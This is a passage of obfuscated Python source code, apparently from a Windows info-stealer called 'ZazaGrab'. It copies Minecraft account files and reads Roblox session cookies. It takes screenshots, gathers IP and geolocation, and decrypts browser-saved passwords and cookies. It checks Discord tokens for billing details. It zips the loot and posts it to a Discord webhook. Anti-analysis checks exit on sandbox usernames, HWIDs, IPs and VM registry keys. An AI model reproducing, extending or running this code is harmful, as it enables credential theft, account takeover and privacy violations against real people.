            OOOOOOO0OOOOO000O =False #line:979
            OOOOOOO0OOOOO000O =bool (len (OO000O00000O00O0O )>0 )#line:980
            O0OOOO0OO0OO00OO0 =bool (len (json .loads (httpx .get (O0OOO0O00OO00000O .dscap1 +"/billing/payment-sources",headers =O0OOO0O00OO00000O .g3t_H (OO0O0OO0O000O0OOO )).text ))>0 )#line:981
            OOOOOOOOO000O0O0O .write (f"{' '*17}{O0O0O00O00O000O0O}\n{'-'*50}\nBilling?: {O0OOOO0OO0OO00OO0}\nNitro: {OOOOOOO0OOOOO000O}\nBadges: {O0OO00000OOO0OO0O}\nPhone: {O0OOOO0O00O00OO00}\nToken: {OO0O0OO0O000O0OOO}\nEmail: {OOO0O000O0O0OOOOO}\n\n")#line:984
        OOOOOOOOO000O0O0O .close ()#line:985
    def grabb_mc (O0OOOO0O00OO00000 ):#line:988
        O00OO00OO000OOOO0 =ntpath .join (O0OOOO0O00OO00000 .dir ,'Minecraft')#line:989
        os .makedirs (O00OO00OO000OOOO0 ,exist_ok =True )#line:990
        OO0O000O00000O0O0 =ntpath .join (O0OOOO0O00OO00000 .roaming ,'.minecraft')#line:991
        O00OOOOOO000O00O0 =['launcher_accounts.json','launcher_profiles.json','usercache.json','launcher_log.txt']#line:994
        for _OOOO00OO00OO0O00O in O00OOOOOO000O00O0 :#line:997
            if ntpath .exists (ntpath .join (OO0O000O00000O0O0 ,_OOOO00OO00OO0O00O )):#line:998
                shutil .copy2 (ntpath .join (OO0O000O00000O0O0 ,_OOOO00OO00OO0O00O ),O00OO00OO000OOOO0 +O0OOOO0O00OO00000 .sep +_OOOO00OO00OO0O00O )#line:999
    def grabb_roblox (OO0O000OOO00OOO0O ):#line:1003
        def OO00O0O000OOO00OO (OOO0OOOO0O00OO0O0 ):#line:1004
            try :#line:1005
                return subprocess .check_output (fr"powershell Get-ItemPropertyValue -Path {OOO0OOOO0O00OO0O0}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",creationflags =0x08000000 ).decode ().rstrip ()#line:1008
            except Exception :#line:1009
                return None #line:1010
        O00OO0OOOOOO0O000 =OO00O0O000OOO00OO (r'HKLM')#line:1011
        if not O00OO0OOOOOO0O000 :#line:1012
            O00OO0OOOOOO0O000 =OO00O0O000OOO00OO (r'HKCU')#line:1013
        if O00OO0OOOOOO0O000 :#line:1014
            OO0O000OOO00OOO0O .robloxcookies .append (O00OO0OOOOOO0O000 )#line:1015
        if OO0O000OOO00OOO0O .robloxcookies :#line:1016
            with open (OO0O000OOO00OOO0O .dir +"\\Roblox_Cookies.txt","w")as O00000OOO0000000O :#line:1017
                for OOO000O00O0O0OOOO in OO0O000OOO00OOO0O .robloxcookies :#line:1018
                    O00000OOO0000000O .write (OOO000O00O0O0OOOO +'\n')#line:1019
    def steal_screen (OOOO0OOO0O00OO0OO ):#line:1021
        O0OO0OO0OO00O0000 =ImageGrab .grab (bbox =None ,include_layered_windows =False ,all_screens =True ,xdisplay =None )#line:1027
        O0OO0OO0OO00O0000 .save (OOOO0OOO0O00OO0OO .dir +"\\Screenshot.png")#line:1028
        O0OO0OO0OO00O0000 .close ()#line:1029
    def system_informations (O00OO00OOOOOOO0O0 ):#line:1031
        OOO00OOOOOOOO0O00 =f"""
{infocom} | {vctm_pc}
Windows key: {O00OO00OOOOOOO0O0.w1nk33y}
Windows version: {O00OO00OOOOOOO0O0.w1nv3r}
RAM: {r4m}GB
DISK: {d1sk}GB
HWID: {O00OO00OOOOOOO0O0.uuidwndz}
IP: {O00OO00OOOOOOO0O0.ip}
City: {O00OO00OOOOOOO0O0.city}
Country: {O00OO00OOOOOOO0O0.country}
Region: {O00OO00OOOOOOO0O0.region}
Org: {O00OO00OOOOOOO0O0.org}
GoogleMaps: {O00OO00OOOOOOO0O0.googlemap}
        """#line:1045
        with open (O00OO00OOOOOOO0O0 .dir +"\\System_Info.txt","w",encoding ="utf-8",errors ='ignore')as OOOO0OOOOO000O00O :#line:1046
            OOOO0OOOOO000O00O .write (OOO00OOOOOOOO0O00 )#line:1047
    def finished_zg (O000O00OO0OOO0OO0 ):#line:1055
        for OO0OOO0OO0OO0O0O0 in os .listdir (O000O00OO0OOO0OO0 .dir ):#line:1056
            if OO0OOO0OO0OO0O0O0 .endswith ('.txt'):#line:1057
                O00O0OOOOOOOOO0O0 =O000O00OO0OOO0OO0 .dir +O000O00OO0OOO0OO0 .sep +OO0OOO0OO0OO0O0O0 #line:1058
                with open (O00O0OOOOOOOOO0O0 ,"r",errors ="ignore")as O0O0O00O0O0OOOOOO :#line:1059
                    O0OO0000OOO000O0O =O0O0O00O0O0OOOOOO .read ()#line:1060
                    if not O0OO0000OOO000O0O :#line:1061
                        O0O0O00O0O0OOOOOO .close ()#line:1062
                        os .remove (O00O0OOOOOOOOO0O0 )#line:1063
                    else :#line:1064
                        with open (O00O0OOOOOOOOO0O0 ,"w",encoding ="utf-8",errors ="ignore")as O0O0000OO000OO0O0 :#line:1065
                            O0O0000OO000OO0O0 .write ("Zaza Grab Create By ZAZA | https://github.com/zazaman4000\n\n")#line:1066
                        with open (O00O0OOOOOOOOO0O0 ,"a",encoding ="utf-8",errors ="ignore")as OO0OO0OOOOOOO0O0O :#line:1067
                            OO0OO0OOOOOOO0O0O .write (O0OO0000OOO000O0O +"\n\nZaza Grab Create By ZAZA | https://github.com/zazaman4000")#line:1068
        _OO0O0O000000O000O =ntpath .join (O000O00OO0OOO0OO0 .appdata ,f'zg-[{infocom}].zip')#line:1070
        O0OOO0OOOO00O00O0 =zipfile .ZipFile (_OO0O0O000000O000O ,"w",zipfile .ZIP_DEFLATED )#line:1071
        O0O0O0OOOOO0O00OO =ntpath .abspath (O000O00OO0OOO0OO0 .dir )#line:1072
        for O0O00OO0O0000000O ,_O00OOOO0O0OOO0O00 ,O000OOO00OOO000O0 in os .walk (O000O00OO0OOO0OO0 .dir ):#line:1073
            for OO0OOOO0OOOOOO0O0 in O000OOO00OOO000O0 :#line:1074
                O00O00OO0OOO0000O =ntpath .abspath (ntpath .join (O0O00OO0O0000000O ,OO0OOOO0OOOOOO0O0 ))#line:1075
                O00O0O000OO000OO0 =O00O00OO0OOO0000O [len (O0O0O0OOOOO0O00OO )+1 :]#line:1076
                O0OOO0OOOO00O00O0 .write (O00O00OO0OOO0000O ,O00O0O000OO000OO0 )#line:1077
        O0OOO0OOOO00O00O0 .close ()#line:1078
        OOOO0OOOOOO0O00OO ,OO0OOO0O0O00OOO00 ,O000O0OO000O0OO00 =0 ,'',''#line:1080
        for _O00OOOO0O0OOO0O00 ,__ ,O000OOO00OOO000O0 in os .walk (O000O00OO0OOO0OO0 .dir ):#line:1081
            for _OO00OO000000OOOO0 in O000OOO00OOO000O0 :#line:1082
                OO0OOO0O0O00OOO00 +=f"・{_OO00OO000000OOOO0}\n"#line:1083
                OOOO0OOOOOO0O00OO +=1 #line:1084
        for OOO00OOOOOOO00000 in O000O00OO0OOO0OO0 .tokens :#line:1085
            O000O0OO000O0OO00 +=f'{OOO00OOOOOOO00000}\n\n'#line:1086
        OO0O0OO000OOOO000 =f"{OOOO0OOOOOO0O00OO} Files Found: "#line:1087
        O0O0O00OO00OO0000 ={'name':"ZazaGrab",'avatar_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/zazagrab%20-%20injection.jpg','embeds':[{'author':{'name':f'ZazaGrab v3.1.0','url':'https://github.com/zazaman4000','icon_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/mona-loading-dark.gif'},'color':374276 ,'description':f'[zazagrab has Geo Localised this guy]({O000O00OO0OOO0OO0.googlemap})','fields':[{'name':'\u200b','value':f'''```fix
                                IP: {O000O00OO0OOO0OO0.ip.replace(" ", " ") if O000O00OO0OOO0OO0.ip else "N/A"}
                                Org: {O000O00OO0OOO0OO0.org.replace(" ", " ") if O000O00OO0OOO0OO0.org else "N/A"}
                                City: {O000O00OO0OOO0OO0.city.replace(" ", " ") if O000O00OO0OOO0OO0.city else "N/A"}
                                Region: {O000O00OO0OOO0OO0.region.replace(" ", " ") if O000O00OO0OOO0OO0.region else "N/A"}
                                Country: {O000O00OO0OOO0OO0.country.replace(" ", " ") if O000O00OO0OOO0OO0.country else "N/A"}```
                            '''.replace (' ',''),'inline':True },{'name':'\u200b','value':f'''```fix
                                Computer Name: {vctm_pc.replace(" ", " ")}
                                Windows Key: {O000O00OO0OOO0OO0.w1nk33y.replace(" ", " ")}
                                Windows Ver: {O000O00OO0OOO0OO0.w1nv3r.replace(" ", " ")}
                                Disk Stockage: {d1sk}GB
                                Ram Stockage: {r4m}GB```
                            '''.replace (' ',''),'inline':True },{'name':'**- Tokens:**','value':f'''```yaml
                                {O000O0OO000O0OO00 if O000O0OO000O0OO00 else "tokens not found"}```
                            '''.replace (' ',''),'inline':False },{'name':OO0O0OO000OOOO000 ,'value':f'''```ini
                                [
                                {OO0OOO0O0O00OOO00.strip()}
                                ]```
                            '''.replace (' ',''),'inline':False }],'footer':{'text':'Zaza Grab Create By ZAZA・https://github.com/zazaman4000'}}]}#line:1146
        with open (_OO0O0O000000O000O ,'rb')as O0O0000OO000OO0O0 :#line:1149
            if O000O00OO0OOO0OO0 .regex_webhook_dsc in O000O00OO0OOO0OO0 .discord_webhook :#line:1150
                httpx .post (O000O00OO0OOO0OO0 .discord_webhook ,json =O0O0O00OO00OO0000 )#line:1151
                httpx .post (O000O00OO0OOO0OO0 .discord_webhook ,files ={'upload_file':O0O0000OO000OO0O0 })#line:1152
        os .remove (_OO0O0O000000O000O )#line:1153
class NoDebugg (Functions ):#line:1161
    inVM =False #line:1162
    def __init__ (OOOOO000O0000O00O ):#line:1164
        OOOOO000O0000O00O .processes =list ()#line:1165
        OOOOO000O0000O00O .bluseurs =["WDAGUtilityAccount","BvJChRPnsxn","Harry Johnson","SqgFOf3G","RGzcBUyrznReg","h7dk1xPr","Robert","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl",]#line:1170
        OOOOO000O0000O00O .blpcname =["DESKTOP-CDLNVOQ","BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH","DESKTOP-B0T93D6"]#line:1175
        OOOOO000O0000O00O .blhwid =["7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","79AF5279-16CF-4094-9758-F88A616D81B4","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","BB64E044-87BA-C847-BC0A-C797D1A16A50","2E6FB594-9D55-4424-8E74-CE25A25E36B0","42A82042-3F13-512F-5E3D-6BF4FFFD8518"]#line:1187
        OOOOO000O0000O00O .blips =['88.132.231.71','78.139.8.50','20.99.160.173','88.153.199.169','84.147.62.12','194.154.78.160','92.211.109.160','195.74.76.222','188.105.91.116','34.105.183.68','92.211.55.199','79.104.209.33','95.25.204.90','34.145.89.174','109.74.154.90','109.145.173.169','34.141.146.114','212.119.227.151','195.239.51.59','192.40.57.234','64.124.12.162','34.142.74.220','188.105.91.173','109.74.154.91','34.105.72.241','109.74.154.92','213.33.142.50','109.74.154.91','93.216.75.209','192.87.28.103','88.132.226.203','195.181.175.105','88.132.225.100','92.211.192.144','34.83.46.130','188.105.91.143','34.85.243.241','34.141.245.25','178.239.165.70','84.147.54.113','193.128.114.45','95.25.81.24','92.211.52.62','88.132.227.238','35.199.6.13','80.211.0.97','34.85.253.170','23.128.248.46','35.229.69.227','34.138.96.23','192.211.110.74','35.237.47.12','87.166.50.213','34.253.248.228','212.119.227.167','193.225.193.201','34.145.195.58','34.105.0.27','195.239.51.3','35.192.93.107']#line:1201
        for O0O0O0O00000OOO00 in [OOOOO000O0000O00O .lstchec ,OOOOO000O0000O00O .regkey ,OOOOO000O0000O00O .sp3cCheq ]:#line:1203
            OO0O0OOOOO0OOO00O =threading .Thread (target =O0O0O0O00000OOO00 ,daemon =True )#line:1204
            OOOOO000O0000O00O .processes .append (OO0O0OOOOO0OOO00O )#line:1205
            OO0O0OOOOO0OOO00O .start ()#line:1206
        for OO0OO00O0O0O0OOO0 in OOOOO000O0000O00O .processes :#line:1207
            try :#line:1208
                OO0OO00O0O0O0OOO0 .join ()#line:1209
            except RuntimeError :#line:1210
                continue #line:1211
    def programExit (OOOOO000000OOO00O ):#line:1213
        OOOOO000000OOO00O .__class__ .inVM =True #line:1214
    def lstchec (OOOO0OO0OO0O000OO ):#line:1216
        for O0OOOOO0OO0O0OOO0 in [r'D:\Tools',r'D:\OS2',r'D:\NT3X']:#line:1217
            if ntpath .exists (O0OOOOO0OO0O0OOO0 ):#line:1218
                OOOO0OO0OO0O000OO .programExit ()#line:1219
        for OO0OOO0O00O00OOOO in OOOO0OO0OO0O000OO .bluseurs :#line:1221
            if infocom ==OO0OOO0O00O00OOOO :#line:1222
                OOOO0OO0OO0O000OO .programExit ()#line:1223
        for O0OOOOOOOOOOO000O in OOOO0OO0OO0O000OO .blpcname :#line:1225
            if vctm_pc ==O0OOOOOOOOOOO000O :#line:1226
                OOOO0OO0OO0O000OO .programExit ()#line:1227
        for O000OO0000O0000O0 in OOOO0OO0OO0O000OO .blips :#line:1229
            if OOOO0OO0OO0O000OO .net_1fo ()[0 ]==O000OO0000O0000O0 :#line:1230
                OOOO0OO0OO0O000OO .programExit ()#line:1231
        for O0O00OO000O0O00OO in OOOO0OO0OO0O000OO .blhwid :#line:1233
            if OOOO0OO0OO0O000OO .sys_1fo ()[0 ]==O0O00OO000O0O00OO :#line:1234
                OOOO0OO0OO0O000OO .programExit ()#line:1235
    def sp3cCheq (OOOO00OOOO00O0OO0 ):#line:1237
        if int (r4m )<=3 :#line:1238
            OOOO00OOOO00O0OO0 .programExit ()#line:1239
        if int (d1sk )<=120 :#line:1240
            OOOO00OOOO00O0OO0 .programExit ()#line:1241
        if int (psutil .cpu_count ())<=1 :#line:1242
            OOOO00OOOO00O0OO0 .programExit ()#line:1243
    def regkey (OOOOOOOO0O00OOOOO ):#line:1245
        OO00O0O0OOOOOOO0O =os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")#line:1246
        OO0OO0OO0OO0000OO =os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")#line:1247
        if (OO00O0O0OOOOOOO0O and OO0OO0OO0OO0000OO )!=1 :#line:1248
            OOOOOOOO0O00OOOOO .programExit ()#line:1249
        OO0OO0O0000O0O0O0 =winreg .OpenKey (winreg .HKEY_LOCAL_MACHINE ,'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')#line:1251
        try :#line:1252
            OOO0OO0OOO0O0O000 =winreg .QueryValueEx (OO0OO0O0000O0O0O0 ,'0')[0 ]#line:1253
            if ("VMware"or "VBOX")in OOO0OO0OOO0O0O000 :#line:1254
                OOOOOOOO0O00OOOOO .programExit ()#line:1255
        finally :#line:1256
            winreg .CloseKey (OO0OO0O0000O0O0O0 )#line:1257
if __name__ =="__main__"and os .name =="nt":#line:1264
    asyncio .run (zg_initial_func ().init ())#line:1265
local =os .getenv ('LOCALAPPDATA')#line:1271
roaming =os .getenv ('APPDATA')#line:1272
temp =os .getenv ("TEMP")#line:1273
Threadlist =[]#line:1274
def fetch_conf (OO000O00O0O0O0000 :str )->str or bool |None :#line:1276
        return __config__ .get (OO000O00O0O0O0000 )#line:1277
hook =fetch_conf ("yourwebhookurl")#line:1279
class DATA_BLOB (Structure ):#line:1281
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:1285
def GetData (O00O0OO000OO00OOO ):#line:1287
    OOOOOOOOO0OO0OOO0 =int (O00O0OO000OO00OOO .cbData )#line:1288
    OOOO0O0OOO0OOO000 =O00O0OO000OO00OOO .pbData #line:1289
    O0O0O0O00OOO0OOO0 =c_buffer (OOOOOOOOO0OO0OOO0 )#line:1290
    cdll .msvcrt .memcpy (O0O0O0O00OOO0OOO0 ,OOOO0O0OOO0OOO000 ,OOOOOOOOO0OO0OOO0 )#line:1291
    windll .kernel32 .LocalFree (OOOO0O0OOO0OOO000 )#line:1292
    return O0O0O0O00OOO0OOO0 .raw #line:1293
def CryptUnprotectData (O0OOO00O00OO0OOO0 ,entropy =b''):#line:1295
    O0OOO0OOOOO00OOOO =c_buffer (O0OOO00O00OO0OOO0 ,len (O0OOO00O00OO0OOO0 ))#line:1296
    O0OO0OO0OOOO0O0OO =c_buffer (entropy ,len (entropy ))#line:1297
    OO00OOO000O000O00 =DATA_BLOB (len (O0OOO00O00OO0OOO0 ),O0OOO0OOOOO00OOOO )#line:1298
    O0O0OO0OO0O00OOOO =DATA_BLOB (len (entropy ),O0OO0OO0OOOO0O0OO )#line:1299
    OO0O0O0O000O00OO0 =DATA_BLOB ()#line:1300
    if windll .crypt32 .CryptUnprotectData (byref (OO00OOO000O000O00 ),None ,byref (O0O0OO0OO0O00OOOO ),None ,None ,0x01 ,byref (OO0O0O0O000O00OO0 )):#line:1302
        return GetData (OO0O0O0O000O00OO0 )#line:1303
def DecryptValue (O000OO0O00OOOO00O ,master_key =None ):#line:1305
    OO0O00O000OO0OO00 =O000OO0O00OOOO00O .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:1306
    if OO0O00O000OO0OO00 =='v10'or OO0O00O000OO0OO00 =='v11':#line:1307
        O0OOOOOO000O0000O =O000OO0O00OOOO00O [3 :15 ]#line:1308
        OOO00O0OO00OOOO00 =O000OO0O00OOOO00O [15 :]#line:1309
        OO00OOO000OO0OO0O =AES .new (master_key ,AES .MODE_GCM ,O0OOOOOO000O0000O )#line:1310
        OO0O00O0OO00OOOOO =OO00OOO000OO0OO0O .decrypt (OOO00O0OO00OOOO00 )#line:1311
        OO0O00O0OO00OOOOO =OO0O00O0OO00OOOOO [:-16 ].decode ()#line:1312
        return OO0O00O0OO00OOOOO #line:1313
def LoadRequests (OOOO0O0OOO00OOO00 ,OO000OO0OO0O0OO00 ,data ='',files ='',headers =''):#line:1315
    for OO0OO0O0OOO000000 in range (8 ):#line:1316
        try :#line:1317
            if OOOO0O0OOO00OOO00 =='POST':#line:1318
                if data !='':#line:1319
                    OOOOO00O00OO00OOO =requests .post (OO000OO0OO0O0OO00 ,data =data )#line:1320
                    if OOOOO00O00OO00OOO .status_code ==200 :#line:1321
                        return OOOOO00O00OO00OOO #line:1322
                elif files !='':#line:1323
                    OOOOO00O00OO00OOO =requests .post (OO000OO0OO0O0OO00 ,files =files )#line:1324
                    if OOOOO00O00OO00OOO .status_code ==200 or OOOOO00O00OO00OOO .status_code ==413 :#line:1325
                        return OOOOO00O00OO00OOO #line:1326
        except :#line:1327
            pass #line:1328
def LoadUrlib (O00OO0O000O00OO0O ,data ='',files ='',headers =''):#line:1330
    for OO0O0O00O00OOOOOO in range (8 ):#line:1331
        try :#line:1332
            if headers !='':#line:1333
                OO000O000O0OO0OO0 =urlopen (Request (O00OO0O000O00OO0O ,data =data ,headers =headers ))#line:1334
                return OO000O000O0OO0OO0 #line:1335
            else :#line:1336
                OO000O000O0OO0OO0 =urlopen (Request (O00OO0O000O00OO0O ,data =data ))#line:1337
                return OO000O000O0OO0OO0 #line:1338
        except :#line:1339
            pass #line:1340
def Trust (OOOO000OOO0O0OO00 ):#line:1343
    global DETECTED #line:1344
    OOO0000OO0OO0O000 =str (OOOO000OOO0O0OO00 )#line:1345
    OO0OOOO000000OO0O =re .findall (".google.com",OOO0000OO0OO0O000 )#line:1346
    if len (OO0OOOO000000OO0O )<-1 :#line:1347
        DETECTED =True #line:1348
        return DETECTED #line:1349
    else :#line:1350
        DETECTED =False #line:1351
        return DETECTED #line:1352
def Reformat (OOOOO0OOOO000OO0O ):#line:1357
    OOOOO0OO0OOOO0OO0 =re .findall ("(\w+[a-z])",OOOOO0OOOO000OO0O )#line:1358
    while "https"in OOOOO0OO0OOOO0OO0 :OOOOO0OO0OOOO0OO0 .remove ("https")#line:1359
    while "com"in OOOOO0OO0OOOO0OO0 :OOOOO0OO0OOOO0OO0 .remove ("com")#line:1360
    while "net"in OOOOO0OO0OOOO0OO0 :OOOOO0OO0OOOO0OO0 .remove ("net")#line:1361
    return list (set (OOOOO0OO0OOOO0OO0 ))#line:1362
def upload (OOO00OOO0OO0000O0 ,tk =''):#line:1364
    O0O0O0000O0O0O00O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:1368
    if OOO00OOO0OO0000O0 =="zg_checking":#line:1370
        O0O0OO0O000OOO0O0 ={"content":'',"embeds":[{"fields":[{"name":"Interesting files found on user PC:","value":tk }],"author":{'name':f'Zaza - Grab v3.1.0','url':'https://github.com/zazaman4000','icon_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/mona-loading-dark.gif'},"footer":{"text":"github.com/zazaman4000"},'color':374276 ,}],"avatar_url":"https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/frame_1_delay-0.16s-removebg-preview.jpg","attachments":[]}#line:1394
        LoadUrlib (hook ,data =dumps (O0O0OO0O000OOO0O0 ).encode (),headers =O0O0O0000O0O0O00O )#line:1395
        return #line:1396
    OO000O00O000O00O0 =OOO00OOO0OO0000O0 #line:1398
    O0OO0O0O00O0OO000 ={'file':open (OO000O00O000O00O0 ,'rb')}#line:1399
    if "zg_allpasswords"in OOO00OOO0OO0000O0 :#line:1401
        O000OOO0O0OO0OO0O =' | '.join (OO00O00000O0OOO0O for OO00O00000O0OOO0O in paswWords )#line:1403
        if len (O000OOO0O0OO0OO0O )>1000 :#line:1405
            O0OO0OO0OO0OOO0O0 =Reformat (str (paswWords ))#line:1406
            O000OOO0O0OO0OO0O =' | '.join (OOO00O000O0OO0O00 for OOO00O000O0OO0O00 in O0OO0OO0OO0OOO0O0 )#line:1407
        O0O0OO0O000OOO0O0 ={"content":'',"embeds":[{"fields":[{"name":"Passwords Found:","value":O000OOO0O0OO0OO0O }],"author":{'name':f'Zaza - Grab v3.1.0','url':'https://github.com/zazaman4000','icon_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/mona-loading-dark.gif'},"footer":{"text":"github.com/zazaman4000",},'color':374276 ,}],"avatar_url":"https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/image.jpg","attachments":[]}#line:1432
        LoadUrlib (hook ,data =dumps (O0O0OO0O000OOO0O0 ).encode (),headers =O0O0O0000O0O0O00O )#line:1433
    if "zg_allcookies"in OOO00OOO0OO0000O0 :#line:1435
        O0O00O000O0000O00 =' | '.join (OO000OO000O00OOOO for OO000OO000O00OOOO in cookiWords )#line:1436
        if len (O0O00O000O0000O00 )>1000 :#line:1437
            O0O00O0OO000O0OOO =Reformat (str (cookiWords ))#line:1438
            O0O00O000O0000O00 =' | '.join (OOO0O0000OOO0O0O0 for OOO0O0000OOO0O0O0 in O0O00O0OO000O0OOO )#line:1439
        O0O0OO0O000OOO0O0 ={"content":'',"embeds":[{"fields":[{"name":"Cookies Found:","value":O0O00O000O0000O00 }],"author":{'name':f'Zaza - Grab v3.1.0','url':'https://github.com/zazaman4000','icon_url':'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/zazagrab.gif'},"footer":{"text":"github.com/zazaman4000",},'color':374276 ,}],"avatar_url":"https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/master/image.jpg","attachments":[]}#line:1464
        LoadUrlib (hook ,data =dumps (O0O0OO0O000OOO0O0 ).encode (),headers =O0O0O0000O0O0O00O )#line:1465
    LoadRequests ("POST",hook ,files =O0OO0O0O00O0OO000 )#line:1467
def writeforfile (O0O00000OOO000O0O ,OO000O00O0000O0O0 ):#line:1469
    O0OO0O0O0000O00O0 =os .getenv ("TEMP")+f"\{OO000O00O0000O0O0}.txt"#line:1470
    with open (O0OO0O0O0000O00O0 ,mode ='w',encoding ='utf-8')as OO0OOOO0000O0000O :#line:1471
        OO0OOOO0000O0000O .write (f"Created by ZAZA | https://github.com/zazaman4000\n\n")#line:1472
        for OOOO0OO0OOO0O0OOO in O0O00000OOO000O0O :#line:1473
            if OOOO0OO0OOO0O0OOO [0 ]!='':#line:1474
                OO0OOOO0000O0000O .write (f"{OOOO0OO0OOO0O0OOO}\n")#line:1475
Passw =[]#line:1479
def getPassw (O0OOOO0OO000OOO0O ,O0OO0000O0O0O0O0O ):#line:1480
    global Passw #line:1481
    if not os .path .exists (O0OOOO0OO000OOO0O ):return #line:1482
    OO0O000O00OOO00O0 =O0OOOO0OO000OOO0O +O0OO0000O0O0O0O0O +"/Login Data"#line:1484
    if os .stat (OO0O000O00OOO00O0 ).st_size ==0 :return #line:1485
    O0O0000OOO00O0O0O =temp +"zazagrabed"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OOO00OO00O00OOOO0 in range (8 ))+".db"#line:1487
    shutil .copy2 (OO0O000O00OOO00O0 ,O0O0000OOO00O0O0O )#line:1488
    O0000OO0000000O0O =connect (O0O0000OOO00O0O0O )#line:1489
    OO000O000000O0O00 =O0000OO0000000O0O .cursor ()#line:1490
    OO000O000000O0O00 .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:1491
    OOOOO0O0O00O0O000 =OO000O000000O0O00 .fetchall ()#line:1492
    OO000O000000O0O00 .close ()#line:1493
    O0000OO0000000O0O .close ()#line:1494
    os .remove (O0O0000OOO00O0O0O )#line:1495
    O000O0000O00OOO00 =O0OOOO0OO000OOO0O +"/Local State"#line:1497
    with open (O000O0000O00OOO00 ,'r',encoding ='utf-8')as OOOOOOOOO0O0OOO0O :O0O000OOO000OOO0O =loads (OOOOOOOOO0O0OOO0O .read ())#line:1498
    OO00O00O00000O00O =b64decode (O0O000OOO000OOO0O ['os_crypt']['encrypted_key'])#line:1499
    OO00O00O00000O00O =CryptUnprotectData (OO00O00O00000O00O [5 :])#line:1500
    for OOOO00000O0O00OO0 in OOOOO0O0O00O0O000 :#line:1502
        if OOOO00000O0O00OO0 [0 ]!='':#line:1503
            for O0OOO000OOOOOO00O in keyword :#line:1504
                OO0O0O00O000O0OOO =O0OOO000OOOOOO00O #line:1505
                if "https"in O0OOO000OOOOOO00O :#line:1506
                    OO0OO0OO000O0OOOO =O0OOO000OOOOOO00O #line:1507
                    O0OOO000OOOOOO00O =OO0OO0OO000O0OOOO .split ('[')[1 ].split (']')[0 ]#line:1508
                if O0OOO000OOOOOO00O in OOOO00000O0O00OO0 [0 ]:#line:1509
                    if not OO0O0O00O000O0OOO in paswWords :paswWords .append (OO0O0O00O000O0OOO )#line:1510
            Passw .append (f"URL: {OOOO00000O0O00OO0[0]} \n ID: {OOOO00000O0O00OO0[1]} \n PASSW0RD: {DecryptValue(OOOO00000O0O00OO0[2], OO00O00O00000O00O)}\n\n")#line:1511
    writeforfile (Passw ,'zg_allpasswords')#line:1512
Cookies =[]#line:1514
def getCookie (OO0O0OOOO0O000O0O ,OOO00O0OOO0OO00OO ):#line:1515
    global Cookies #line:1516
    if not os .path .exists (OO0O0OOOO0O000O0O ):return #line:1517
    OO0O0O0OO0OOOO0OO =OO0O0OOOO0O000O0O +OOO00O0OOO0OO00OO +"/Cookies"#line:1519
    if os .stat (OO0O0O0OO0OOOO0OO ).st_size ==0 :return #line:1520
    OOO00OOO00OOO0OO0 =temp +"zazagrabed"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O0O00OO0OO0OO00OO in range (8 ))+".db"#line:1522
    shutil .copy2 (OO0O0O0OO0OOOO0OO ,OOO00OOO00OOO0OO0 )#line:1524
    OO00O000O00OOOO0O =connect (OOO00OOO00OOO0OO0 )#line:1525
    OO00O00000OO0O000 =OO00O000O00OOOO0O .cursor ()#line:1526
